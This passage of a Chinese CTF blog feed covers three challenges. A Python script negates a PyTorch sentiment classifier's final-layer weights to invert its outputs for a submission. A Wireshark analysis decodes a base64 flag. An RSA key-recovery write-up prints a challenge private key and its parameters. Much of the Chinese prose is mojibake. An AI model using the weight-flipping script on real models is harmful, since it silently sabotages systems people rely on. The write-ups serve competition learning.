class="hljs-built_in">list</span>(sd.keys())[:<span class="hljs-number">50</span>]):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  <span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>:02d&#125;</span>. <span class="hljs-subst">&#123;k&#125;</span>    shape=<span class="hljs-subst">&#123;<span class="hljs-built_in">tuple</span>(sd[k].shape) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(sd[k], torch.Tensor) <span class="hljs-keyword">else</span> <span class="hljs-built_in">type</span>(sd[k])&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[INFO] è‡ªåŠ¨å®šä½åˆ° weight: &#x27;<span class="hljs-subst">&#123;wkey&#125;</span>&#x27;  bias: &#x27;<span class="hljs-subst">&#123;bkey&#125;</span>&#x27;&quot;</span>)<br>    <span class="hljs-comment"># å¤‡ä»½</span><br>    new_sd = &#123;&#125;<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> sd.items():<br>        new_sd[k] = v.clone() <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(v, torch.Tensor) <span class="hljs-keyword">else</span> v<br><br>    <span class="hljs-comment"># ç¿»è½¬ weight / bias</span><br>    new_sd[wkey] = -new_sd[wkey]<br>    <span class="hljs-keyword">if</span> bkey:<br>        new_sd[bkey] = -new_sd[bkey]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[OK] å·²å°† <span class="hljs-subst">&#123;wkey&#125;</span> ä¸ <span class="hljs-subst">&#123;bkey&#125;</span> å–è´Ÿã€‚&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[OK] å·²å°† <span class="hljs-subst">&#123;wkey&#125;</span> å–è´Ÿã€‚æœªæ‰¾åˆ°å¯¹åº” bias (å°†ä»…ç¿»è½¬ weight)ã€‚&quot;</span>)<br><br>    torch.save(new_sd, output_path)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[OK] å·²ä¿å­˜ç¿»è½¬åæ¨¡å‹ä¸º: <span class="hljs-subst">&#123;output_path&#125;</span>  (<span class="hljs-subst">&#123;os.path.getsize(output_path)/<span class="hljs-number">1024</span>:<span class="hljs-number">.1</span>f&#125;</span> KB)&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quick_self_test</span>(<span class="hljs-params">original_path, flipped_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è‹¥å·¥ç¨‹åŒ…å« src.model.TextClassifier å’Œ src.parameters.Parametersï¼Œ</span><br><span class="hljs-string">    æ­¤å‡½æ•°ä¼šåŠ è½½ä¸¤ä»½ state_dict åˆ°æ¨¡å‹å¹¶å¯¹ä¸€ä¸ªé›¶è¾“å…¥è¿›è¡Œæ¯”å¯¹ï¼ˆè¿‘ä¼¼ y + y_flipped â‰ˆ 1ï¼‰ã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">from</span> src.parameters <span class="hljs-keyword">import</span> Parameters<br>        <span class="hljs-keyword">from</span> src.model <span class="hljs-keyword">import</span> TextClassifier<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[SKIP TEST] æœªèƒ½å¯¼å…¥ TextClassifier/Parametersï¼ˆ&quot;</span>, e, <span class="hljs-string">&quot;)ï¼Œè·³è¿‡è‡ªæ£€ã€‚&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    params = Parameters()<br>    model_a = TextClassifier(params)<br>    model_b = TextClassifier(params)<br><br>    sd_a = torch.load(original_path, map_location=<span class="hljs-string">&#x27;cpu&#x27;</span>)<br>    sd_b = torch.load(flipped_path, map_location=<span class="hljs-string">&#x27;cpu&#x27;</span>)<br><br>    <span class="hljs-comment"># å¦‚æœç”¨æˆ·ä¿å­˜çš„æ˜¯æ•´ model å¯¹è±¡ï¼Œå°è¯•è·å– state_dict</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(sd_a, <span class="hljs-built_in">dict</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">hasattr</span>(sd_a, <span class="hljs-string">&#x27;state_dict&#x27;</span>):<br>        sd_a = sd_a.state_dict()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(sd_b, <span class="hljs-built_in">dict</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">hasattr</span>(sd_b, <span class="hljs-string">&#x27;state_dict&#x27;</span>):<br>        sd_b = sd_b.state_dict()<br><br>    model_a.load_state_dict(sd_a)<br>    model_b.load_state_dict(sd_b)<br>    model_a.<span class="hljs-built_in">eval</span>(); model_b.<span class="hljs-built_in">eval</span>()<br><br>    seq_len = params.seq_len <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(params, <span class="hljs-string">&#x27;seq_len&#x27;</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">if</span> seq_len <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[SKIP TEST] Parameters æœªåŒ…å« seq_lenï¼Œæ— æ³•æ„é€ è¾“å…¥è¿›è¡Œè‡ªæ£€ã€‚&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># æ„é€ ä¸€ä¸ªé›¶è¾“å…¥ / éšæœºè¾“å…¥ï¼ˆbatch_size=1, seq_lenï¼‰</span><br>    inp = torch.zeros((<span class="hljs-number">1</span>, seq_len), dtype=torch.long)<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        out_a = model_a(inp)<br>        out_b = model_b(inp)<br>        <span class="hljs-comment"># å¤„ç†ä¸åŒè¾“å‡ºç»´åº¦æƒ…å†µ</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_scalar</span>(<span class="hljs-params">x</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(x, torch.Tensor):<br>                x = x.detach()<br>                <span class="hljs-keyword">if</span> x.numel() == <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>                x = x.squeeze()<br>                <span class="hljs-keyword">if</span> x.dim() == <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(x.item())<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># å–ç¬¬ä¸€ä¸ªå…ƒç´ </span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(x.view(-<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>].item())<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        va = to_scalar(out_a)<br>        vb = to_scalar(out_b)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[SELF TEST] åŸæ¨¡å‹è¾“å‡º (sample): <span class="hljs-subst">&#123;va&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[SELF TEST] ç¿»è½¬åæ¨¡å‹è¾“å‡º (sample): <span class="hljs-subst">&#123;vb&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">if</span> va <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> vb <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[SELF TEST] va + vb = <span class="hljs-subst">&#123;va + vb:<span class="hljs-number">.6</span>f&#125;</span> (æ¥è¿‘ 1 åˆ™è¡¨ç¤ºç¿»è½¬æˆåŠŸ)&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;Flip final linear layer (weight &amp; bias) in a PyTorch state_dict to invert outputs (approx 1 - y).&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--input&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;è¾“å…¥çš„ state_dict æ–‡ä»¶ (pth)&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--output&quot;</span>, <span class="hljs-string">&quot;-o&quot;</span>, default=<span class="hljs-string">&quot;flipped_model.pth&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;è¾“å‡ºæ–‡ä»¶å&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--weight-key&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;æ‰‹åŠ¨æŒ‡å®šè¦ç¿»è½¬çš„ weight keyï¼ˆå¯é€‰ï¼‰&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--bias-key&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;æ‰‹åŠ¨æŒ‡å®šè¦ç¿»è½¬çš„ bias keyï¼ˆå¯é€‰ï¼‰&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--test&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;å°è¯•å¯¹åŸ/ç¿»è½¬æ¨¡å‹åšå¿«é€Ÿè‡ªæ£€ï¼ˆéœ€èƒ½å¯¼å…¥ src.modelï¼‰&quot;</span>)<br>    args = parser.parse_args()<br><br>    <span class="hljs-keyword">if</span> args.weight_key:<br>        sd = torch.load(args.<span class="hljs-built_in">input</span>, map_location=<span class="hljs-string">&#x27;cpu&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(sd, <span class="hljs-built_in">dict</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">hasattr</span>(sd, <span class="hljs-string">&#x27;state_dict&#x27;</span>):<br>            sd = sd.state_dict()<br>        <span class="hljs-keyword">if</span> args.weight_key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> sd:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[ERROR] æŒ‡å®šçš„ weight key ä¸å­˜åœ¨: <span class="hljs-subst">&#123;args.weight_key&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;state_dict keys preview:&quot;</span>)<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(sd.keys())[:<span class="hljs-number">50</span>]:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  &quot;</span>, k)<br>            sys.exit(<span class="hljs-number">2</span>)<br>        <span class="hljs-comment"># ç›´æ¥ç¿»è½¬æŒ‡å®šçš„ keys</span><br>        <span class="hljs-keyword">if</span> args.bias_key <span class="hljs-keyword">and</span> args.bias_key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> sd:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[ERROR] æŒ‡å®šçš„ bias key ä¸å­˜åœ¨: <span class="hljs-subst">&#123;args.bias_key&#125;</span>&quot;</span>)<br>            sys.exit(<span class="hljs-number">2</span>)<br>        new_sd = &#123;&#125;<br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> sd.items():<br>            new_sd[k] = v.clone() <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(v, torch.Tensor) <span class="hljs-keyword">else</span> v<br>        new_sd[args.weight_key] = -new_sd[args.weight_key]<br>        <span class="hljs-keyword">if</span> args.bias_key:<br>            new_sd[args.bias_key] = -new_sd[args.bias_key]<br>        torch.save(new_sd, args.output)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[OK] ç¿»è½¬å¹¶ä¿å­˜åˆ° <span class="hljs-subst">&#123;args.output&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">if</span> args.test:<br>            quick_self_test(args.<span class="hljs-built_in">input</span>, args.output)<br>        sys.exit(<span class="hljs-number">0</span>)<br><br>    ok = flip_last_layer(args.<span class="hljs-built_in">input</span>, args.output)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FAILED] è‡ªåŠ¨ç¿»è½¬å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨æŒ‡å®š --weight-key å’Œ --bias-keyï¼ˆå‚è€ƒ state_dict.keys()ï¼‰&quot;</span>)<br>        sys.exit(<span class="hljs-number">2</span>)<br><br>    <span class="hljs-keyword">if</span> args.test:<br>        quick_self_test(args.<span class="hljs-built_in">input</span>, args.output)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>å…ˆä½¿ç”¨<code>example.py</code>è¿è¡Œå¾—åˆ°ä¸€ä¸ªå¹²å‡€æ¨¡å‹ï¼Œç„¶åæ‰§è¡Œ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python flip_model<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">i</span> sentiment_model<span class="hljs-selector-class">.pth</span> -o submitted_model<span class="hljs-selector-class">.pth</span> <span class="hljs-attr">--test</span><br></code></pre></td></tr></table></figure><h1 id="æ•°æ®å®‰å…¨"><a href="#æ•°æ®å®‰å…¨" class="headerlink" title="æ•°æ®å®‰å…¨"></a>æ•°æ®å®‰å…¨</h1><h2 id="RealCheckIn-1"><a href="#RealCheckIn-1" class="headerlink" title="RealCheckIn-1"></a>RealCheckIn-1</h2><p>Wireshark æ‰“å¼€æµé‡åŒ…ï¼Œå…ˆè¯•ç€æœç´¢  <code>flag</code> ï¼Œå‘ç°ä¸€æ®µå¯ç–‘æµé‡ï¼Œè²Œä¼¼æœ‰ <code>flag.txt</code> çš„æ–‡ä»¶<br><img src="/2025/09/20/%E7%AC%AC%E4%BA%94%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%20%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/file-20250914143530510.png"><br>è¿½è¸ªä¸€ä¸‹ TCP æµ<br><img src="/2025/09/20/%E7%AC%AC%E4%BA%94%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%20%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/file-20250914143631920.png"><br>å‘ç°å¯ç–‘æ•°æ®ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“å­—ç¬¦ä¸²â€œflag{â€çš„ Base64 ç¼–ç å­—ç¬¦æ˜¯â€œZmxhZ3â€å¼€å¤´çš„ï¼Œå› æ­¤å‘ç° echo çš„å¯èƒ½å°±æ˜¯ flagï¼Œè§£ç ä¸€ä¸‹ï¼Œç¡®å®å¾—åˆ°äº† flagã€‚<br><img src="/2025/09/20/%E7%AC%AC%E4%BA%94%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%20%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89/file-20250914143848512.png"></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>â€œç½‘è°·æ¯â€å®‰å…¨æå®¢å¤§èµ› Writeup</title>
    <link href="/2025/09/13/%E2%80%9C%E7%BD%91%E8%B0%B7%E6%9D%AF%E2%80%9D%E5%AE%89%E5%85%A8%E6%9E%81%E5%AE%A2%E5%A4%A7%E8%B5%9B%20Writeup/"/>
    <url>/2025/09/13/%E2%80%9C%E7%BD%91%E8%B0%B7%E6%9D%AF%E2%80%9D%E5%AE%89%E5%85%A8%E6%9E%81%E5%AE%A2%E5%A4%A7%E8%B5%9B%20Writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¢å¿µ"><a href="#ç¢å¿µ" class="headerlink" title="ç¢å¿µ"></a>ç¢å¿µ</h2><p>è¿™æ¬¡æ¯”èµ›æ˜¯åœ¨çœ‹è§ç¾¤é‡Œæœ‰äººè¯´èµ·è¿™ä¸ªæ¯”èµ›ï¼Œåˆšå¥½é—²ç€æ²¡äº‹é¡ºæ‰‹æ‰“äº†ä¸€ä¸‹ï¼Œä¸»è¦å†™äº† Crypto å’Œ MISC ï¼ˆæµé‡åˆ†æä¹Ÿç®— MISC å§ï¼‰æ–¹å‘çš„é¢˜ç›®ï¼Œæ•´ä½“æ¥çœ‹éš¾åº¦ä¸é«˜ï¼Œä½†æœ‰äº›æ—¶å€™éœ€è¦ä¸€äº›æƒ³è±¡åŠ›ï¼Œå› ä¸ºå¯¹å…¶ä»–çš„æ–¹å‘å¹¶ä¸æ˜¯å¾ˆäº†è§£ï¼Œå› æ­¤ä¸€ä¸ªäººæƒ³æ‰“å…¥å†³èµ›è¿˜æ˜¯æœ‰ç‚¹éš¾åº¦çš„&#x3D;ÍŸÍŸÍÍ( â€¢Ì€Ğ´â€¢Ì)<br>ä¸è¿‡æƒ³è¦åæ§½çš„ä¸€ç‚¹å°±æ˜¯è¿™ä¸ªæ¯”èµ›çš„èµ›åˆ¶ï¼Œæ²¡æƒ³åˆ°å®ƒçš„åŠ¨æ€ç§¯åˆ†ç«Ÿç„¶æ˜¯è¶Šæ—©æäº¤åˆ†è¶Šé«˜ï¼Œé‚£è¿™æ ·çš„è¯æ‹¼çš„ä¸å°±æ˜¯ç®€å•é¢˜çš„æ‰‹é€Ÿå’Œç½‘é€Ÿäº†å—ï¼Œç®€å•é¢˜å’Œéš¾é¢˜éƒ½æ²¡æœ‰ä»€ä¹ˆå·®åˆ«äº†ï¼Œæ„Ÿè§‰æ˜¯æœ‰ç‚¹ç¦»è°±çš„ã€‚ã€‚</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="è¯ä¹¦ä¿®å¤-wgb"><a href="#è¯ä¹¦ä¿®å¤-wgb" class="headerlink" title="è¯ä¹¦ä¿®å¤-wgb"></a>è¯ä¹¦ä¿®å¤-wgb</h2><p>æœ¬é¢˜è€ƒæŸ¥ PEMï¼Œé¦–å…ˆæˆ‘ä»¬è¦äº†è§£ç§é’¥æ–‡ä»¶çš„æ ¼å¼</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">RSAPrivateKey ::= <span class="hljs-keyword">SEQUENCE</span> &#123;<br>  <span class="hljs-keyword">version</span>           <span class="hljs-keyword">Version</span>,           <span class="hljs-comment">-- INTEGERï¼ˆä¸€èˆ¬æ˜¯ 0ï¼‰</span><br>  modulus           <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- n</span><br>  publicExponent    <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- e</span><br>  privateExponent   <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- d</span><br>  prime1            <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- p</span><br>  prime2            <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- q</span><br>  exponent1         <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- d mod (p-1)</span><br>  exponent2         <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- d mod (q-1)</span><br>  coefficient       <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- q^(-1) mod p</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>ç›´æ¥ç»™å‡ºäº†ç§é’¥æ–‡ä»¶ï¼Œå°† base64 è§£ç åèƒ½å¤Ÿå¾—åˆ° nã€dï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ç›´æ¥è§£å¯†<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">MIICXAIBAAKBgQCsnlJbVdPOwSCVdI6tiL7J88QfPFomm4mySzKu6AHCVS8gMJc+<br>OTV+k14Q3M9PjqEDQfpt/oP2nNq0Z8sDYErT323Q75gsJM8YNe+sK/W2qzsP/XP2<br>y+Z6qLZXYXgE9g1ofqeZYgcwN819Xiw7ELHkHP53w+KChUDp7fJH/s0+wwIDAQAB<br>AoGAIwia5Gid7UdrCoo2bufi+O/dbQ19qnpEzwfOCIuT19IcF2dlOr63qbHVFI0M<br>EjR7X0LjxbEzLTkWdijenhfL96+IwzPig5PFL1dzxwp7bFct/9sQNuf/FZD1eC56<br>QjzXxOD0v9itzVMvbIR80MclgEK1zUeg7tlIRHCofoLoALECQQD8sNNSgmMKdXBt<br>dimY6ziK/xXtQ2TW2ekQ8l2VT5f/HD2M6n7gwadSPM2P2/UVC2ekK9SMGwe5giGR<br>bTerjjNZAkEAruELdXFBj/iheihbSXO3uDf9+BdvQFyMDIjPDTjx3GaY2Rwvl1Da<br>Cnwx2326mW3fuRYT/r9KZ9ViM5VX23vLewJAF7VrjnFHY6LTMqIEkyF2w6vdXc6V<br>9oaplHp5B1pZc4ktyTvzPZlN3qxvyRClNR1F0yR9o8uhdOldxuxNbd5AuQJAAJAi<br>7E7gCimfw3fry1G/Dq3HeIwCxK9HmCa8m+tKBA6kgVZw5MjS2uPJeU5vUl0jMkJa<br>8CAHikwKk+XwMXm1jwJBAK8rEl7TVWO5vmP2Xt/JITHUu5qSgYB9p9YwnfhQa4b/<br>rOIIFyuuq0tg3xASP+50O+fqvSOK5gZIx+KbNtWugcI=<br></code></pre></td></tr></table></figure><br> è½¬æ¢æˆåå…­è¿›åˆ¶åï¼Œå¯ä»¥æŒ‰ç…§ä¸Šè¾¹æ ¼å¼æ‹†åˆ†ï¼Œæœ€ç»ˆå¾—åˆ°ï¼š<br> <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">121216793759965406495195349784688471172903898464863919579528667261419201175006158506254851920269184174476441342645096664857617956346276850231302641370595849992364168925183323567715165305825214477546120105756089950903529561478112787635175307546002017263761103481685637785188859785795387227441771118141108993731</span><br><span class="hljs-attribute">d</span> <span class="hljs-operator">=</span> <span class="hljs-number">24601440007954283409258790415889365626604738597756305511807235656867674669709582591386480696270815244895420087866738342299329789849425948470734950224610450629270896689735724164750653504067075012851069860052288413393492140397638874689747304249627737638521072321625292497180208183282090634794285367566044496049</span><br></code></pre></td></tr></table></figure></p><p>ç›´æ¥ç»™å‡ºç§é’¥ dï¼Œç›´æ¥è§£å¯†</p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>ä¸ flag1 ç›¸æ¯”ï¼Œå¤šäº†ä¸€ä¸ªå…¬é’¥æ–‡ä»¶ï¼Œé‡Œè¾¹åªæœ‰ nã€eï¼Œ<br>è€Œç§é’¥æ–‡ä»¶çš„å‰åŠéƒ¨åˆ†ä¸æ˜¾ç¤ºï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¾—åˆ° pã€qï¼Œå¹¶ä¸” nã€e å’Œå…¬é’¥æ–‡ä»¶ä¸­ç›¸åŒï¼Œå› æ­¤ä¹Ÿå¯ä»¥ç›´æ¥è§£ rsa äº†ã€‚</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">88024091485722968131203129772830524881654529625144134588814340590011554124604316403258794718595058760192581465181932954405288276198255951037890441057834815115351239151027730304080110594116192807779817527469691548261644538550529011882499685981945213841298369305720161373509056672240371216670722254664850792423</span><br><span class="hljs-attribute">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">65537</span><br><span class="hljs-attribute">p</span> <span class="hljs-operator">=</span> <span class="hljs-number">9582848127563543144923745964600370727631625906884933335707836734329263380236258927038536326818153720067174259502906373148203118612164064303294028202007639</span><br><span class="hljs-attribute">q</span> <span class="hljs-operator">=</span> <span class="hljs-number">9185587657654265271925862790545538824407691820908394988893401857915219018271791875599781315096940084389655919586711021311553394520708985687587340820963057</span><br></code></pre></td></tr></table></figure><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>ä¸ç¬¬äºŒé—®ä¸åŒçš„æ˜¯ï¼Œè¯¥ç§é’¥æ–‡ä»¶å‰è¾¹ç¼ºå¤±çš„åœ°æ–¹æ›´å¤šï¼Œä½†è§‚å¯Ÿåå‘ç°ä»ç„¶å¯ä»¥å¾—åˆ° d mod p-1ï¼Œd mod q-1ï¼Œå³ dpï¼Œç„¶åä¾¿å¯ä»¥ä½¿ç”¨æœ€å¸¸è§„çš„ dp æ³„éœ²çš„æ€è·¯æ¥åš</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">161097000312435047639025857083798608426453770394810689419872061300529854423940452844900091705515387130272189159935215821125906831946941166430461267964034092194438035823677086083564924149614045494613496178826123777949284989729443312266399276493423985154752448654420778684877265358368899693320567387749119123981</span><br><span class="hljs-attribute">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">65537</span><br><span class="hljs-attribute">dp</span> <span class="hljs-operator">=</span> <span class="hljs-number">8466156897235505876858915949875848826731809609609498324537270201005685410904242916171703973272057335477219350238441206686126349368220272071006389601023573</span><br><br></code></pre></td></tr></table></figure><h3 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>c1 = bytes_to_long(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag1/flag1.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read())<br>c2 = bytes_to_long(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag2/flag2.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read())<br>c3 = bytes_to_long(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag3/flag3.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read())<br><br>n1 = <span 